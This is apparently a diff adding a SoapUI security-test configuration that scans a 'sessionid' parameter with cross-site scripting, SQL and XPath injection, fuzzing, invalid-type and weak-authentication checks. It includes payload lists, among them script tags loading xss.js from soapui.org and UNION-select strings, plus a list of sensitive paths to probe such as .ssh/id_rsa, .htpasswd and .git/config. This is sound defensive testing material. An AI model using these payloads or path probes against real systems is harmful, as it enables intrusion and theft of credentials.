+        <con:parameterExposureStrings>&lt;? echo('&lt;SCR)';echo('IPT>alert("XSS")&lt;/SCRIPT>'); ?></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="http://soapui.org/somecommand.php?somevariables=maliciouscode"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>Redirect 302 /a.jpg http://soapui.org/admin.asp&amp;deleteuser</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&amp;lt;SCRIPT&amp;gt;alert('XSS')&amp;lt;/SCRIPT&amp;gt;"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;HEAD>&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> &lt;/HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT a=">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT =">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT a=">" '' SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT "a='>'" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT a=`>` SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT a=">'>" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT>document.write("&lt;SCRI");&lt;/SCRIPT>PT SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="0ce47f9b-6331-4429-8ce8-cbb2dda092a4" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:assertion type="CrosSiteScript" id="eceba66a-64e4-4d16-87ea-1ebb662d5980" name="Cross Site Scripting Detection">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:parameters label="sessionid" parameterName="sessionid" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityScan type="FuzzingScan" name="Fuzzing Scan" id="2a1cf3d4-7309-4e5f-ad34-f217bec5d485" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:type="con:FuzzerScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:minimal>5</con:minimal>
+        <con:maximal>15</con:maximal>
+        <con:numberOfRequest>100</con:numberOfRequest>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="c55b0379-47eb-47ef-b2c3-048d917f1552" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:parameters label="sessionid" parameterName="sessionid" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true" immutable="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ALL_AT_ONCE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityScan type="InvalidTypesSecurityScan" name="Invalid Types" id="1bb7f263-60ef-4507-922f-1e9730e59362" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:type="con:InvalidSecurityScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:typesList>
+          <con:type>3</con:type>
+          <con:value>true</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>4</con:type>
+          <con:value>GpM7</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>5</con:type>
+          <con:value>0FB7</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>9</con:type>
+          <con:value>-1E4f</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>10</con:type>
+          <con:value>12.45E+12</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>11</con:type>
+          <con:value>-1.23</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>12</con:type>
+          <con:value>SoapUI is	 the
+ best</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>13</con:type>
+          <con:value>P1Y2M3DT10H30M12.3S</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>14</con:type>
+          <con:value>1999-05-31T13:20:00.000-05:00</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>16</con:type>
+          <con:value>1999-05-31</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>22</con:type>
+          <con:value>-1267896799</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>23</con:type>
+          <con:value>-882223334991111111</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>24</con:type>
+          <con:value>-2147483647</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>25</con:type>
+          <con:value>-32768</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>26</con:type>
+          <con:value>127</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>27</con:type>
+          <con:value>0</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>28</con:type>
+          <con:value>-1</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>29</con:type>
+          <con:value>1</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>30</con:type>
+          <con:value>1267896799</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>31</con:type>
+          <con:value>882223334991111111</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>32</con:type>
+          <con:value>294967295</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>33</con:type>
+          <con:value>65535</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>34</con:type>
+          <con:value>255</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>35</con:type>
+          <con:value>SoapUI is the best</con:value>
+        </con:typesList>
+        <con:typesList>
+          <con:type>36</con:type>
+          <con:value>SoapUI is the best</con:value>
+        </con:typesList>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="08871f29-802d-4698-b523-a558d88fc934" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:parameters label="sessionid" parameterName="sessionid" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityScan type="SQLInjectionScan" name="SQL Injection" id="3eecff1c-728e-42c6-81e6-1741c3120f66" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:type="con:SQLInjectionScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:sqlInjectionStrings>' or '1'='1</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>'--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1'</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin'--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>/*!10000%201/0%20*/</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>/*!10000 1/0 */</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1/0</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>'%20o/**/r%201/0%20--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' o/**/r 1/0 --</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>;</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>'%20and%201=2%20--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' and 1=2 --</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>test�%20UNION%20select%201,%20@@version,%201,%201;�</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>test� UNION select 1, @@version, 1, 1;�</con:sqlInjectionStrings>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="0f7ea8ef-2855-4d80-8d47-f83dcb37c5f6" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:parameters label="sessionid" parameterName="sessionid" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityScan type="XPathInjectionSecurityScan" name="XPath Injection" id="fc047244-a709-4f50-8a55-64971a1fc77b" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:type="con:XPathInjection" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:xpathList>or name(//users/LoginID[1]) = 'LoginID' or 'a'='b</con:xpathList>
+        <con:xpathList>' or '1'='1</con:xpathList>
+        <con:xpathList>1/0</con:xpathList>
+        <con:xpathList>'%20o/**/r%201/0%20--</con:xpathList>
+        <con:xpathList>' o/**/r 1/0 --</con:xpathList>
+        <con:xpathList>;</con:xpathList>
+        <con:xpathList>'%20and%201=2%20--</con:xpathList>
+        <con:xpathList>' and 1=2 --</con:xpathList>
+        <con:xpathList>test�%20UNION%20select%201,%20@@version,%201,%201;�</con:xpathList>
+        <con:xpathList>test� UNION select 1, @@version, 1, 1;�</con:xpathList>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="e4b4d092-5baf-4f64-8877-0e5363c179fd" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:parameters label="sessionid" parameterName="sessionid" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityProScan type="HttpMethodFuzzingScan" name="HTTP Method Fuzzing" id="3450f07d-384b-4990-9680-c2b7a6a6d453" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:type="con:HttpMethodFuzzingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:deselectedMethods/>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="c2db1a7e-8adb-4b5c-8a77-00f3e992ea5e" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:assertion type="Valid HTTP Status Codes" id="510ada3a-0647-4b39-b2ab-dfb1f1032d01" name="Valid HTTP Status Codes">
+        <con:settings>
+          <con:setting id="__LEVEL_">WARNING</con:setting>
+        </con:settings>
+        <con:configuration>
+          <codes>501,405,403</codes>
+        </con:configuration>
+      </con:assertion>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityProScan>
+    <con:testStepSecurityProScan type="SensitiveFileSecurityScan" name="Sensitive Files Exposure" id="e799cabd-b613-4543-910f-895a53da1bdd" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:type="con:SensitiveFileSecurityScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/known_hosts"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/authorized_keys"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa.bak"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa.old"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa~"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa.bak"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa.old"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa~"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess.bak"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess.old"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/htaccess.txt"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess~"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd.bak"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd.old"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd~"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.bash_history"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.bashrc"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.history"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.profile"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.mysql_history"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/~root"/>
+        <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.git/config"/>
+        <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.git/HEAD"/>
+        <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.git/index"/>
+        <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.svn/entries"/>
+        <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.svn/wc.db"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/pccsmysqladm/incs/dbconnect.inc"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/perl/"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/phpBB/phpinfo.php"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/weblogic"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/wp-admin/wp-login.php"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/wp-content/debug.log"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/WEB-INF/web.xml"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/iisadmin/"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/iissamples/"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.jsp"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.php"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.html.bak"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.html.old"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.html~"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/manager"/>
+        <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/config/database.yml"/>
+        <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/config/initializers/secret_token.rb"/>
+        <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/db/seeds.rb"/>
+        <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/db/development.sqlite3"/>
+      </con:config>
+      <con:assertion type="Sensitive Files Exposure Assertion" id="8d30509a-00db-4b19-a2d4-75353c762398" name="Sensitive Files Exposure"/>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityProScan>
+    <con:testStepSecurityProScan type="WeakAuthenticationScan" name="Weak Authentication" id="57c27c1f-4abf-49ee-b8a9-1ebdd7132bdf" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
+      <con:settings/>
+      <con:config xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:assertion type="WeakPassword" id="8c878ad4-8c43-46c2-9994-32e46137af15" name="Weak Password Detection">
+        <con:configuration/>
+      </con:assertion>
+      <con:assertion type="BasicAuth" id="8c1431f7-1732-42fa-ba1d-852bd296275c" name="Basic Authentication Detection"/>
+      <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
+      <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityProScan>
+  </con:testStepSecurityTest>
+  <con:properties/>
+  <con:reportParameters/>
+</con:securityTest>
